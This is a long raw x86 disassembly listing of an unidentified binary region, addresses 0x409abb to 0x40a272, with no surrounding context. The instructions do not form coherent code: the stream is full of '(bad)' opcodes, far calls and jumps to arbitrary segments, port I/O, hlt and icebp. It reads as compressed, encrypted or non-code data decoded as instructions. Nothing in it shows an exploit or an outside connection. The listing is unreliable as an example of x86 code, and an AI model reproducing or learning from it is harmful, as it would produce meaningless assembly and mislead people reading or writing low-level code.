  409abb:	jp     0x409a63
  409abd:	mov    ebp,0x360a482
  409ac2:	add    BYTE PTR [esi],ch
  409ac4:	add    edx,DWORD PTR [esi+0x275b4c62]
  409aca:	mov    esi,0x8b96665a
  409acf:	outs   dx,BYTE PTR ds:[esi]
  409ad0:	call   0xb4bd:0x56f47f
  409ad7:	jns    0x409ad0
  409ad9:	push   esp
  409ada:	test   eax,0x88da95c6
  409ae0:	call   0x1035:0xa0aaebad
  409ae7:	ret    
  409ae8:	aad    0x5
  409aea:	jl     0x409a8f
  409aec:	and    BYTE PTR [ebx+0x79288245],cl
  409af2:	and    DWORD PTR [ecx],esi
  409af4:	lock test eax,0xe707e10d
  409afa:	inc    ebx
  409afb:	in     eax,dx
  409afc:	push   cs
  409afd:	cmp    al,0x6f
  409aff:	dec    esp
  409b00:	sub    edx,DWORD PTR [eax-0x6fa6fc22]
  409b06:	(bad)
  409b09:	and    DWORD PTR [ebx-0x1f5c6f9b],esi
  409b0f:	or     cl,BYTE PTR [edi]
  409b11:	mov    bh,0xb5
  409b13:	fdivr  DWORD PTR [ebx-0x7d606d53]
  409b19:	xor    BYTE PTR ds:0xb1dc6423,dh
  409b1f:	fwait
  409b20:	xor    edx,0xbee0d7dd
  409b26:	pop    esi
  409b27:	rol    DWORD PTR [edx-0x409015c],cl
  409b2d:	inc    esi
  409b2e:	shl    dl,0x19
  409b31:	lods   eax,DWORD PTR ds:[esi]
  409b32:	scas   eax,DWORD PTR es:[edi]
  409b33:	mov    ecx,0x68a48b0e
  409b38:	ret    0xa33e
  409b3b:	dec    esp
  409b3c:	mov    ch,0x5e
  409b3e:	cmp    bl,BYTE PTR [edi]
  409b40:	mov    ch,0x2f
  409b42:	mov    ds:0xbc0b8545,al
  409b47:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b49:	pop    ebx
  409b4a:	icebp  
  409b4b:	shl    DWORD PTR [ecx],0x11
  409b4e:	ins    DWORD PTR es:[edi],dx
  409b4f:	sbb    bh,0x4a
  409b52:	sbb    BYTE PTR gs:[edi+0x3ff48ad0],dl
  409b59:	push   eax
  409b5a:	inc    edx
  409b5b:	jnp    0x409b7b
  409b5d:	clc    
  409b5e:	je     0x409ba9
  409b60:	lods   al,BYTE PTR ds:[esi]
  409b61:	sub    al,0x9a
  409b63:	stos   DWORD PTR es:[edi],eax
  409b64:	ret    0x49b9
  409b67:	adc    ah,BYTE PTR [edi+0x5]
  409b6a:	pushf  
  409b6b:	inc    ecx
  409b6c:	pop    ecx
  409b6d:	lahf   
  409b6e:	sbb    BYTE PTR [eax-0x5a],bh
  409b71:	inc    ebx
  409b72:	scas   eax,DWORD PTR es:[edi]
  409b73:	mov    dl,BYTE PTR [eax-0x4d08b328]
  409b79:	mov    ah,0xbf
  409b7b:	call   0x4c3:0x54301c4c
  409b82:	outs   dx,BYTE PTR ds:[esi]
  409b83:	test   al,0x0
  409b85:	outs   dx,DWORD PTR ds:[esi]
  409b86:	cmp    al,al
  409b88:	dec    edi
  409b89:	or     DWORD PTR [eax],0xffffffb2
  409b8c:	pop    ss
  409b8d:	imul   ebp,DWORD PTR [esi+ecx*2-0x21d0347f],0x24
  409b95:	in     eax,0x6c
  409b97:	out    dx,al
  409b98:	cmp    DWORD PTR [eax+eiz*4],esp
  409b9b:	adc    al,0x1a
  409b9d:	mov    dh,0x7a
  409b9f:	cwde   
  409ba0:	add    dh,BYTE PTR [ebx]
  409ba2:	cmc    
  409ba3:	mov    dl,0xa9
  409ba5:	stos   BYTE PTR es:[edi],al
  409ba6:	mov    al,ds:0xbfad1024
  409bab:	lock div DWORD PTR [ecx-0x2c53995d]
  409bb2:	push   es
  409bb3:	add    ch,BYTE PTR [eax+0x723ffeb9]
  409bb9:	adc    eax,0x6a4f5bc4
  409bbe:	cwde   
  409bbf:	add    eax,0x2ae81915
  409bc4:	mov    dl,0x15
  409bc6:	lea    esi,[ecx+0x77]
  409bc9:	gs inc ecx
  409bcb:	xchg   esp,eax
  409bcc:	sub    edi,DWORD PTR [ecx]
  409bce:	gs std 
  409bd0:	sahf   
  409bd1:	fwait
  409bd2:	test   al,0x27
  409bd4:	xor    edx,esi
  409bd6:	sub    BYTE PTR [ebp+0x67],bl
  409bd9:	repnz outs dx,DWORD PTR ds:[esi]
  409bdb:	mov    bh,0x98
  409bdd:	mov    cl,0x7
  409bdf:	xor    BYTE PTR [esi+0x75],ah
  409be2:	jb     0x409bbf
  409be4:	cmp    al,0x9e
  409be6:	xlat   BYTE PTR ds:[ebx]
  409be7:	sub    al,0x61
  409be9:	mov    esi,0xb1686363
  409bee:	xchg   BYTE PTR [ebp+0x7463a781],al
  409bf4:	(bad)  
  409bf5:	cwde   
  409bf6:	mov    ch,BYTE PTR [ebx-0x23]
  409bf9:	imul   ebx,DWORD PTR [ecx+eax*4-0x2f],0x20
  409bfe:	dec    ecx
  409bff:	test   ebx,edi
  409c01:	not    DWORD PTR [edi+edi*2-0x24729d1c]
  409c08:	clc    
  409c09:	and    DWORD PTR [esi+0x4079d695],eax
  409c0f:	aam    0x84
  409c11:	inc    esi
  409c12:	or     ah,al
  409c14:	sbb    DWORD PTR [edi+0x31],esi
  409c17:	inc    ebx
  409c18:	and    al,BYTE PTR [eax+0x7b6f6f69]
  409c1e:	adc    BYTE PTR [ebx],cl
  409c20:	add    BYTE PTR [ecx-0x73368409],bh
  409c26:	shr    DWORD PTR [ecx-0x7b544673],cl
  409c2c:	and    dh,dh
  409c2e:	mov    esi,0x2cbc7194
  409c33:	sub    ebx,edi
  409c35:	jmp    0x409c17
  409c37:	pop    eax
  409c38:	jle    0x409bef
  409c3a:	push   0xffffff80
  409c3c:	repz rcl BYTE PTR [ebx],cl
  409c3f:	mov    al,0xb2
  409c41:	push   ebx
  409c42:	adc    BYTE PTR [esi+0x25b3e419],0x51
  409c49:	mov    DWORD PTR [ebx],esp
  409c4b:	js     0x409c99
  409c4d:	add    esp,DWORD PTR [esi]
  409c4f:	outs   dx,BYTE PTR ds:[esi]
  409c50:	xor    esi,DWORD PTR [edi]
  409c52:	sahf   
  409c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c54:	(bad)  
  409c55:	imul   eax,DWORD PTR [ecx+edx*4],0xa60f2bf2
  409c5c:	add    al,0x79
  409c5e:	sbb    edx,esp
  409c60:	jno    0x409c39
  409c62:	sbb    eax,0x9ece6fab
  409c67:	pusha  
  409c68:	jecxz  0x409cdc
  409c6a:	out    dx,eax
  409c6b:	sbb    DWORD PTR [ebx],ebp
  409c6d:	push   ds
  409c6e:	cli    
  409c6f:	mov    DWORD PTR [ecx+edx*8-0x64],0xbdfa3130
  409c77:	adc    eax,0x7fef5442
  409c7c:	mov    eax,ds:0x1f06d4f3
  409c81:	loopne 0x409c57
  409c83:	push   esi
  409c84:	mov    edi,fs
  409c86:	pop    esp
  409c87:	test   eax,0x603bb979
  409c8c:	cld    
  409c8d:	mov    dh,0x80
  409c8f:	xor    DWORD PTR [edi+0x5a],ebp
  409c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c93:	pushf  
  409c94:	mov    al,ds:0xa22ad8cc
  409c99:	sbb    eax,0x50425a79
  409c9e:	cli    
  409c9f:	scas   eax,DWORD PTR es:[edi]
  409ca0:	cwde   
  409ca1:	(bad)  
  409ca3:	fwait
  409ca4:	jno    0x409c2c
  409ca6:	adc    al,0xb
  409ca8:	pop    ds
  409ca9:	(bad)  
  409caa:	shr    edx,cl
  409cac:	push   ebx
  409cad:	fsub   QWORD PTR [edx]
  409caf:	sbb    al,0xb8
  409cb1:	test   BYTE PTR [eax+edx*1],0xee
  409cb5:	pop    ecx
  409cb6:	sbb    eax,0xf4f2df4e
  409cbb:	hlt    
  409cbc:	inc    edx
  409cbd:	sbb    eax,0x8bd7dc25
  409cc2:	into   
  409cc3:	icebp  
  409cc4:	stos   BYTE PTR es:[edi],al
  409cc5:	push   edx
  409cc6:	inc    ecx
  409cc7:	and    BYTE PTR [ecx+0x45e42f55],ch
  409ccd:	mov    gs,WORD PTR [ebp+0x7cfebd3a]
  409cd3:	xchg   edx,eax
  409cd4:	(bad)  
  409cd5:	mov    ebp,0x97f052ef
  409cda:	std    
  409cdb:	mov    al,BYTE PTR [ebp+0x41]
  409cde:	loope  0x409d46
  409ce0:	mov    ah,0xcd
  409ce2:	aad    0xd8
  409ce4:	sub    BYTE PTR [eax],dl
  409ce6:	dec    ebp
  409ce7:	mov    eax,ds:0x80fdb21b
  409cec:	call   0x75f8:0x23d1049d
  409cf3:	pop    ebp
  409cf4:	add    al,0x58
  409cf6:	jp     0x409ccf
  409cf8:	xchg   ecx,eax
  409cf9:	out    0x69,al
  409cfb:	mov    cl,BYTE PTR [ebx]
  409cfd:	mov    cl,0x4a
  409cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d00:	enter  0xb25d,0x1c
  409d04:	pop    ds
  409d05:	and    esi,DWORD PTR [ebp+0x4e6a9934]
  409d0b:	mov    ebx,0x4e8873de
  409d10:	mov    BYTE PTR [ebx+0x35],ah
  409d13:	lock xchg ebx,eax
  409d15:	pop    ds
  409d16:	gs mov cl,0x9c
  409d19:	inc    esp
  409d1a:	test   BYTE PTR ss:[ebx],cl
  409d1d:	frstor [ebx]
  409d1f:	mov    ds:0xbe840078,eax
  409d24:	xchg   ebx,eax
  409d25:	mov    ch,0x2d
  409d27:	push   esi
  409d28:	add    cl,BYTE PTR [edx+edx*1-0x7]
  409d2c:	or     esi,ecx
  409d2e:	mov    cl,dl
  409d30:	xchg   ecx,eax
  409d31:	cli    
  409d32:	ss push edi
  409d34:	add    esp,edi
  409d36:	mov    ch,0xec
  409d38:	dec    edi
  409d39:	sbb    dl,bl
  409d3b:	ja     0x409ce7
  409d3d:	and    eax,0x8f62fd64
  409d42:	hlt    
  409d43:	jp     0x409d35
  409d45:	scas   eax,DWORD PTR es:[edi]
  409d46:	clc    
  409d47:	pop    ds
  409d48:	add    dl,ah
  409d4a:	mov    ecx,0x8e0293b
  409d4f:	add    DWORD PTR [edi],0x6e95d1b0
  409d55:	mov    ss:0x27d89c8c,eax
  409d5b:	jmp    0x409d0c
  409d5d:	outs   dx,DWORD PTR ds:[esi]
  409d5e:	cmp    bl,BYTE PTR [ecx+0x63]
  409d61:	mov    edx,0xd089a8d9
  409d66:	sbb    ecx,ebp
  409d68:	sub    bl,ah
  409d6a:	mov    ecx,0x2a6a7b0f
  409d6f:	or     bl,BYTE PTR [esi+0x43520776]
  409d75:	jge    0x409d3f
  409d77:	fwait
  409d78:	outs   dx,DWORD PTR ds:[esi]
  409d79:	ss pop edi
  409d7b:	mov    edi,0xfa1dd294
  409d80:	mov    ds:0xbb3a3c43,eax
  409d85:	sub    al,0x68
  409d87:	lahf   
  409d88:	or     eax,0x6d1165a1
  409d8d:	repnz sub DWORD PTR [eax+0x1d],0x1d
  409d92:	add    eax,0x25746758
  409d97:	shl    BYTE PTR [ebx+0x65],0x49
  409d9b:	fsubrp st(4),st
  409d9d:	clc    
  409d9e:	arpl   WORD PTR [edi+0x45],di
  409da1:	adc    bl,BYTE PTR [edx-0x26c3fd18]
  409da7:	mov    ah,0x72
  409da9:	add    esi,DWORD PTR [esi-0x34980c01]
  409daf:	mov    ebp,0xdc412868
  409db4:	mov    ds:0x2779bf85,eax
  409db9:	or     eax,0xbfaa58cc
  409dbe:	ja     0x1c9b926e
  409dc4:	xlat   BYTE PTR ds:[ebx]
  409dc5:	dec    eax
  409dc6:	gs dec ebx
  409dc8:	jp     0x409d57
  409dca:	int3   
  409dcb:	(bad)  
  409dcc:	ficomp DWORD PTR [esi+0xe31c939]
  409dd2:	aas    
  409dd3:	push   cs
  409dd4:	fstp   TBYTE PTR [edx]
  409dd6:	push   0xfb64a6e3
  409ddb:	sub    al,0xb5
  409ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dde:	cwde   
  409ddf:	enter  0x3a1e,0xfc
  409de3:	dec    esi
  409de4:	jp     0x409de9
  409de6:	xchg   esi,ebx
  409de8:	pop    es
  409de9:	push   ebx
  409dea:	xor    dl,BYTE PTR [edi-0x3691a522]
  409df0:	push   edi
  409df1:	test   al,0x8
  409df3:	(bad)  
  409df5:	dec    esi
  409df6:	xchg   ebx,eax
  409df7:	sbb    DWORD PTR [ecx+0x11],edi
  409dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dfb:	cwde   
  409dfc:	xor    bh,BYTE PTR [eax-0x371b33cd]
  409e02:	(bad)  
  409e03:	dec    edx
  409e04:	cmp    al,0xc4
  409e06:	push   ecx
  409e07:	fimul  DWORD PTR [ebx+0x10]
  409e0a:	retf   
  409e0b:	das    
  409e0c:	inc    ecx
  409e0d:	sar    DWORD PTR [ebp-0x2ae9476b],1
  409e13:	fmul   DWORD PTR [ebx]
  409e15:	bound  ebp,QWORD PTR [ecx]
  409e17:	rcr    BYTE PTR [ebp+0x8],cl
  409e1a:	ss pop eax
  409e1c:	cmp    BYTE PTR [edx-0x30],bh
  409e1f:	mov    ds:0xf8461b21,al
  409e24:	or     ebx,DWORD PTR [ecx+esi*4]
  409e27:	push   esi
  409e28:	int    0xe2
  409e2a:	push   ds
  409e2b:	sub    eax,0x2c0279ae
  409e30:	ins    DWORD PTR es:[edi],dx
  409e31:	inc    edx
  409e32:	test   DWORD PTR [ebx+0x7a8f6f76],eax
  409e38:	pop    ss
  409e39:	gs addr16 in eax,0x2d
  409e3d:	lds    ebp,FWORD PTR [ebx]
  409e3f:	xlat   BYTE PTR ds:[ebx]
  409e40:	mov    dh,0xbf
  409e42:	and    eax,0x1da42087
  409e47:	sahf   
  409e48:	out    dx,al
  409e49:	lock hlt 
  409e4b:	cmp    al,0x7d
  409e4d:	mov    ebx,0x7fe77fe2
  409e52:	out    0x9a,al
  409e54:	xchg   DWORD PTR [edi+ebp*1],esi
  409e57:	call   0x7a77:0x87f2f2f0
  409e5e:	movzx  ecx,si
  409e61:	jge    0x409e13
  409e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e64:	jl     0x409e22
  409e66:	mov    BYTE PTR [ebx+0x22],ah
  409e69:	jmp    0x5fc4ad13
  409e6e:	mov    edx,0x22d4b485
  409e73:	push   0xffffffe2
  409e75:	jg     0x409e1e
  409e77:	xor    BYTE PTR [ebx-0x2e],dl
  409e7a:	sub    ebx,0xffffffbc
  409e7d:	mov    eax,0x5e6a9095
  409e82:	lahf   
  409e83:	aam    0x9c
  409e85:	(bad)  
  409e86:	popa   
  409e87:	arpl   WORD PTR [ebx-0x8],sp
  409e8a:	push   edx
  409e8b:	or     eax,DWORD PTR [ebx+0x25]
  409e8e:	pop    eax
  409e8f:	lahf   
  409e90:	or     ah,BYTE PTR [ebx-0x66]
  409e93:	inc    edi
  409e94:	xchg   esi,eax
  409e95:	nop
  409e96:	icebp  
  409e97:	sub    eax,0x49ec767a
  409e9c:	inc    eax
  409e9d:	popf   
  409e9e:	in     eax,0xa3
  409ea0:	ror    bh,1
  409ea2:	mov    eax,ds:0x6f7e3c29
  409ea7:	in     eax,0xc5
  409ea9:	cwde   
  409eaa:	push   ds
  409eab:	xchg   ebp,eax
  409eac:	stos   BYTE PTR es:[edi],al
  409ead:	mov    ebp,0xf4faf35b
  409eb2:	mov    bl,0x3c
  409eb4:	addr16 add ebp,0xb32238de
  409ebb:	mov    ds:0x926a4005,al
  409ec0:	(bad)  
  409ec1:	iret   
  409ec2:	add    eax,eax
  409ec4:	jecxz  0x409e56
  409ec6:	dec    esi
  409ec7:	daa    
  409ec8:	stos   BYTE PTR es:[edi],al
  409ec9:	lods   eax,DWORD PTR ds:[esi]
  409eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ecb:	xchg   ebp,eax
  409ecc:	bound  ebx,QWORD PTR [esi-0x1e]
  409ecf:	inc    edx
  409ed0:	adc    eax,0x81f2a704
  409ed5:	mov    BYTE PTR [ecx+0x2c],ah
  409ed8:	mov    eax,0x4c2aefbb
  409edd:	xor    bl,dh
  409edf:	fisttp QWORD PTR ds:0x8ad7a9f
  409ee5:	mov    eax,0x39df93d3
  409eea:	gs je  0x409f0f
  409eed:	mov    dl,0x5c
  409eef:	pop    esi
  409ef0:	mov    fs,WORD PTR [eax-0x1354834d]
  409ef6:	repnz xchg ecx,eax
  409ef8:	lods   eax,DWORD PTR gs:[esi]
  409efa:	inc    ecx
  409efb:	out    0xe6,eax
  409efd:	jg     0x409f74
  409eff:	sbb    cl,cl
  409f01:	mov    cl,0x18
  409f03:	push   esi
  409f04:	xor    eax,0x6675fae6
  409f09:	popa   
  409f0a:	push   esp
  409f0b:	push   es
  409f0c:	push   ebp
  409f0d:	jnp    0x409f74
  409f0f:	inc    edi
  409f10:	pop    es
  409f11:	cmp    al,cl
  409f13:	pusha  
  409f14:	test   ebp,edx
  409f16:	xchg   BYTE PTR [edi-0x4e],ch
  409f19:	push   edx
  409f1a:	cmp    BYTE PTR [edi-0x19],al
  409f1d:	push   esi
  409f1e:	mov    edx,DWORD PTR [edi]
  409f20:	in     eax,dx
  409f21:	cmp    eax,0xb325a8e2
  409f26:	and    eax,0xa276185d
  409f2b:	ds inc esp
  409f2d:	gs clc 
  409f2f:	call   0xe76cf804
  409f34:	xor    BYTE PTR [ecx+0x6b],dl
  409f37:	mov    esi,0x22c095c8
  409f3c:	(bad)  
  409f3d:	in     eax,0xf8
  409f3f:	inc    ebp
  409f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f41:	sub    eax,DWORD PTR [eax]
  409f43:	dec    esp
  409f44:	call   FWORD PTR [ecx]
  409f46:	push   edi
  409f47:	push   esi
  409f48:	popa   
  409f49:	and    BYTE PTR [eax+0x24732af],bl
  409f4f:	mov    BYTE PTR [edi+0x53c7ed42],bl
  409f55:	pusha  
  409f56:	cdq    
  409f57:	adc    ebx,DWORD PTR [esi]
  409f59:	mov    ch,0x17
  409f5b:	(bad)  
  409f5c:	data16 add ch,ah
  409f5f:	in     eax,dx
  409f60:	xor    ch,BYTE PTR [ecx]
  409f62:	inc    eax
  409f63:	jno    0x409fb7
  409f65:	cmp    ebp,DWORD PTR [esi]
  409f67:	pop    ebp
  409f68:	(bad)  
  409f69:	out    dx,eax
  409f6a:	ss test eax,0x49316cc9
  409f70:	rol    DWORD PTR [edx+0x5d],1
  409f73:	add    DWORD PTR [eax],eax
  409f75:	aam    0xac
  409f77:	into   
  409f78:	test   DWORD PTR [ecx-0x14ccec32],ebx
  409f7e:	mov    ecx,0x151d59b5
  409f83:	dec    ebx
  409f84:	dec    ebx
  409f85:	jmp    0x1670:0x535c197a
  409f8c:	scas   al,BYTE PTR es:[edi]
  409f8d:	jmp    0xf2b5:0x35ac0fb1
  409f94:	ficomp WORD PTR [esi+0xf3592ed]
  409f9a:	ror    dl,1
  409f9c:	test   BYTE PTR [eax+ecx*4],bl
  409f9f:	lods   al,BYTE PTR ds:[esi]
  409fa0:	or     DWORD PTR [edi+0x2759bfdb],ebx
  409fa6:	stos   BYTE PTR es:[edi],al
  409fa7:	retf   0x1e1
  409faa:	sbb    esi,DWORD PTR [eax-0x7c6d965b]
  409fb0:	loop   0x409f34
  409fb2:	sub    DWORD PTR [esi+0x4cfe3b34],ebp
  409fb8:	sti    
  409fb9:	fs out dx,al
  409fbb:	add    ah,bl
  409fbd:	icebp  
  409fbe:	adc    dl,BYTE PTR [ecx+0x5b6919d]
  409fc4:	inc    ecx
  409fc5:	xchg   ebx,eax
  409fc6:	fiadd  DWORD PTR [ecx+0x3b88cb7f]
  409fcc:	adc    edi,DWORD PTR [esi]
  409fce:	fsubr  DWORD PTR ds:0xd7278580
  409fd4:	test   ebx,0x971861ce
  409fda:	lahf   
  409fdb:	cmp    DWORD PTR [ebx+0xd60199d],esi
  409fe1:	test   al,0x48
  409fe3:	xchg   dl,dh
  409fe5:	sub    al,0x3e
  409fe7:	add    al,0x29
  409fe9:	stos   DWORD PTR es:[edi],eax
  409fea:	ret    0x1e8e
  409fed:	ret    
  409fee:	out    0x8d,eax
  409ff0:	jno    0x409f9d
  409ff2:	mov    ah,0x4b
  409ff4:	es mov bl,0xf7
  409ff7:	loope  0x40a021
  409ff9:	mov    bl,0x8b
  409ffb:	jmp    0x340b:0xcbd4bc9
  40a002:	xor    BYTE PTR [eax],ch
  40a004:	adc    bh,BYTE PTR [esi]
  40a006:	loop   0x40a017
  40a008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a009:	(bad)  
  40a00a:	sti    
  40a00b:	test   al,0x4e
  40a00d:	adc    eax,0xb230b86e
  40a012:	ja     0x409ff2
  40a014:	nop
  40a015:	loopne 0x40a059
  40a017:	lods   al,BYTE PTR ds:[esi]
  40a018:	jb     0x409ffe
  40a01a:	or     DWORD PTR [edx],eax
  40a01c:	aam    0x54
  40a01e:	inc    edx
  40a01f:	lock cdq 
  40a021:	jo     0x409ff8
  40a023:	lds    ebx,FWORD PTR [edx-0x3a2c39fb]
  40a029:	std    
  40a02a:	inc    ecx
  40a02b:	mov    ebp,0xd073da08
  40a030:	jge    0x40a097
  40a032:	fidiv  WORD PTR [ecx+0x4abaedd2]
  40a038:	add    al,0x2c
  40a03a:	xor    dl,cl
  40a03c:	sub    eax,0xa1ff5f59
  40a041:	lods   al,BYTE PTR ds:[esi]
  40a042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a043:	xor    al,0x99
  40a045:	retf   0xb7d
  40a048:	cmp    DWORD PTR [ebp+0xf4453bf],ebp
  40a04e:	and    eax,0x411d29e4
  40a053:	mov    eax,0xb83485a7
  40a058:	push   esp
  40a059:	sub    DWORD PTR [ebp-0x1c89b7d9],0x90858f04
  40a063:	scas   al,BYTE PTR es:[edi]
  40a064:	jl     0x40a028
  40a066:	sbb    dh,BYTE PTR [ebx+ebx*4]
  40a069:	jb     0x409fee
  40a06b:	push   es
  40a06c:	iret   
  40a06d:	inc    ebp
  40a06e:	push   edx
  40a06f:	add    edx,ecx
  40a071:	fdivrp st(0),st
  40a073:	mov    ah,0x20
  40a075:	leave  
  40a076:	scas   al,BYTE PTR es:[edi]
  40a077:	jno    0x40a00e
  40a079:	outs   dx,BYTE PTR ds:[esi]
  40a07a:	inc    ebp
  40a07b:	sbb    eax,0x78e3258b
  40a080:	push   edi
  40a081:	daa    
  40a082:	xor    BYTE PTR [ebx],al
  40a084:	cmp    eax,0x870391e5
  40a089:	push   eax
  40a08a:	ret    0xd74e
  40a08d:	das    
  40a08e:	fcmovnu st,st(2)
  40a090:	cmc    
  40a091:	cmp    ebp,DWORD PTR [edi*8-0x1bc59910]
  40a098:	test   al,0x42
  40a09a:	adc    bl,BYTE PTR [ecx+0x3076e361]
  40a0a0:	ja     0x40a0c0
  40a0a2:	cs in  al,dx
  40a0a4:	and    dl,al
  40a0a6:	and    al,0x3f
  40a0a8:	jmp    0x8282:0xfa5d1818
  40a0af:	or     ah,bl
  40a0b1:	or     eax,DWORD PTR [edx-0x44]
  40a0b4:	sbb    eax,0x7501766a
  40a0b9:	loop   0x40a12b
  40a0bb:	div    BYTE PTR [esi-0x2f]
  40a0be:	dec    ecx
  40a0bf:	pop    ebp
  40a0c0:	xor    esi,DWORD PTR ds:0x895b133b
  40a0c6:	push   ds
  40a0c7:	inc    DWORD PTR ss:[ebx]
  40a0ca:	add    eax,0x630b0c1b
  40a0cf:	sub    DWORD PTR [edx+0x54],esi
  40a0d2:	sbb    bh,BYTE PTR ds:0x353322
  40a0d8:	mov    ebp,0x178171c8
  40a0dd:	xchg   ebp,eax
  40a0de:	mov    DWORD PTR [ecx+0x2ac81b9e],edx
  40a0e4:	sar    BYTE PTR [edx+0x0],1
  40a0e7:	test   DWORD PTR [edi+edi*1-0x50],ebx
  40a0eb:	test   al,0x66
  40a0ed:	hlt    
  40a0ee:	cmp    eax,0xcd37a371
  40a0f3:	jb     0x40a0a3
  40a0f5:	pop    esi
  40a0f6:	frstor [edx+0x6188dd5c]
  40a0fc:	cld    
  40a0fd:	mov    esp,0xdb1cde6
  40a102:	hlt    
  40a103:	aam    0x4a
  40a105:	add    ebx,ebx
  40a107:	jmp    0x70c8:0xb5822398
  40a10e:	adc    esp,DWORD PTR [esi+0x498ca7a5]
  40a114:	mov    DWORD PTR [eax+0x2e7abed0],0xc37ace75
  40a11e:	jmp    0x40a0df
  40a120:	mov    ch,0x29
  40a122:	test   eax,0xf0d84b3f
  40a127:	(bad)  
  40a128:	mov    ecx,0x3808fff
  40a12d:	pop    eax
  40a12e:	dec    edx
  40a12f:	mov    edi,DWORD PTR ds:0xdd1a9e74
  40a135:	mov    edi,0x5c58aa22
  40a13a:	pop    ebp
  40a13b:	loope  0x40a137
  40a13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a13e:	fwait
  40a13f:	push   es
  40a140:	arpl   WORD PTR [eax+0x58],sp
  40a143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a144:	add    ebx,ecx
  40a146:	stc    
  40a147:	leave  
  40a148:	mov    dl,0xa5
  40a14a:	cwde   
  40a14b:	xchg   esp,eax
  40a14c:	xchg   ecx,eax
  40a14d:	jb     0x40a12f
  40a14f:	xor    eax,0xf49b952e
  40a154:	mov    esp,0xf58f927b
  40a159:	or     ebp,DWORD PTR [ecx+0x4c]
  40a15c:	popa   
  40a15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15e:	call   0x6eb7ba61
  40a163:	xlat   BYTE PTR ds:[ebx]
  40a164:	xlat   BYTE PTR ds:[ebx]
  40a165:	cli    
  40a166:	sahf   
  40a167:	or     al,BYTE PTR [edi]
  40a169:	jae    0x40a15d
  40a16b:	mov    ebx,0x329fb2c2
  40a170:	adc    eax,0x6a402a80
  40a175:	(bad)  
  40a176:	adc    DWORD PTR [esi],edi
  40a178:	mov    eax,0xaa48f1e1
  40a17d:	repz xchg ebp,eax
  40a180:	jl     0x40a18f
  40a182:	shl    DWORD PTR [ecx+0x24],0x78
  40a186:	add    BYTE PTR [edx-0x2bb3356d],bh
  40a18c:	lock lock and DWORD PTR [ebx],esi
  40a190:	mov    ch,0x96
  40a192:	dec    esp
  40a193:	jmp    0xdb108a0a
  40a198:	ins    BYTE PTR es:[edi],dx
  40a199:	pop    edi
  40a19a:	push   ds
  40a19b:	sbb    eax,0x19707d50
  40a1a0:	jecxz  0x40a1d2
  40a1a2:	cli    
  40a1a3:	mov    eax,ds:0x1b0da9d0
  40a1a8:	jb     0x40a16a
  40a1aa:	popf   
  40a1ab:	pusha  
  40a1ac:	pop    edi
  40a1ad:	push   0xffffff8c
  40a1af:	cmc    
  40a1b0:	icebp  
  40a1b1:	mov    WORD PTR [esp+edi*4-0x5ad5864d],ss
  40a1b8:	jp     0x40a1b2
  40a1ba:	(bad)  
  40a1bb:	fwait
  40a1bc:	adc    al,0xbe
  40a1be:	mov    ebx,0x92a55c48
  40a1c3:	push   ecx
  40a1c4:	jg     0x40a17e
  40a1c6:	mov    bl,0x30
  40a1c8:	outs   dx,DWORD PTR ds:[esi]
  40a1c9:	push   cs
  40a1ca:	retf   0x5e6b
  40a1cd:	sub    esi,DWORD PTR [ecx+0x515167a6]
  40a1d3:	cwde   
  40a1d4:	jae    0x40a1a1
  40a1d6:	and    ebp,0x7
  40a1d9:	mov    eax,0x491e20e
  40a1de:	call   0x20c1a319
  40a1e3:	push   eax
  40a1e4:	dec    edx
  40a1e5:	faddp  st(2),st
  40a1e7:	rcl    esp,cl
  40a1e9:	push   es
  40a1ea:	repnz ds repnz adc eax,0xe5b6b1df
  40a1f2:	adc    ebp,ebp
  40a1f4:	loope  0x40a238
  40a1f6:	leave  
  40a1f7:	int    0xed
  40a1f9:	inc    esi
  40a1fa:	loopne 0x40a25c
  40a1fc:	dec    ebx
  40a1fd:	mov    edx,0xb1c549ef
  40a202:	or     DWORD PTR [edx],ecx
  40a204:	mov    dl,0x9c
  40a206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a207:	pop    ebp
  40a208:	cs xchg ecx,esi
  40a20b:	in     al,dx
  40a20c:	xchg   ebx,eax
  40a20d:	adc    ebx,edx
  40a20f:	stc    
  40a210:	pop    eax
  40a211:	mov    al,0x5c
  40a213:	bound  eax,QWORD PTR [eax+0x21]
  40a216:	or     DWORD PTR [esi-0x3e18400d],esp
  40a21c:	jns    0x40a27b
  40a21e:	lods   eax,DWORD PTR ds:[esi]
  40a21f:	fs (bad) 
  40a222:	jmp    0x40a250
  40a224:	adc    ch,BYTE PTR [eax-0x18]
  40a227:	cld    
  40a228:	xchg   ebx,eax
  40a229:	sbb    eax,0x3e02abe7
  40a22e:	mov    ebx,0x7e6ceaa7
  40a233:	sbb    esp,DWORD PTR [eax]
  40a235:	inc    esi
  40a236:	lods   al,BYTE PTR ds:[esi]
  40a237:	stos   DWORD PTR es:[edi],eax
  40a238:	adc    eax,0xa24fcd94
  40a23d:	and    BYTE PTR [edi-0x5fa9f4e8],ch
  40a243:	push   edx
  40a244:	adc    edi,esi
  40a246:	inc    ebp
  40a247:	aad    0x42
  40a249:	dec    eax
  40a24a:	lods   eax,DWORD PTR ds:[esi]
  40a24b:	xchg   edi,eax
  40a24c:	sub    edx,DWORD PTR [eax+0x4f44d800]
  40a252:	sar    DWORD PTR [ecx],1
  40a254:	fbstp  TBYTE PTR [eax-0x56132078]
  40a25a:	mov    al,0xcf
  40a25c:	push   0x1780a56f
  40a261:	stc    
  40a262:	cmp    al,0x3e
  40a264:	rcl    DWORD PTR ds:0xf15b82e3,cl
  40a26a:	(bad)  
  40a26b:	fsubr  st(1),st
  40a26d:	mov    esi,0xa876f685
  40a272:	dec    ecx
